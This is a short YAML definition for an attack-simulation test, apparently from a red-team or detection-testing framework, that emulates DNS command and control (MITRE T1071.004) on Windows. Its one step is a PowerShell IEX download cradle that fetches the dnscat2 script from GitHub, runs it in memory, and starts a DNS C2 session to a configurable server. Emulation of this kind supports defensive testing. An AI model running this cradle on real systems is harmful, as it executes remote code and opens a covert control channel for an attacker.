api_version: "2.0"
name: DNS C2
description: |
    This will attempt to start a C2 session using the DNS protocol. You will need to have a listener set up and create DNS records prior to executing this command.
    The following blogs have more information.

    https://github.com/iagox86/dnscat2

    https://github.com/lukebaggett/dnscat2-powershell
args:
    - name: domain
      type: string
      default: example.com
    - name: server_ip
      type: string
      default: 127.0.0.1
uuid: e7bf9802-2e78-4db9-93b5-181b7bcd37d7
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1071: Application Layer Protocol'
    subtechniques:
        - 'T1071.004: DNS'
requirements:
    platforms:
        - os: windows
steps:
    - name: dns-c2
      inline: |
        IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/lukebaggett/dnscat2-powershell/45836819b2339f0bb64eaf294f8cc783635e00c6/dnscat2.ps1')
        Start-Dnscat2 -Domain {{.Args.domain}} -DNSServer {{.Args.server_ip}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
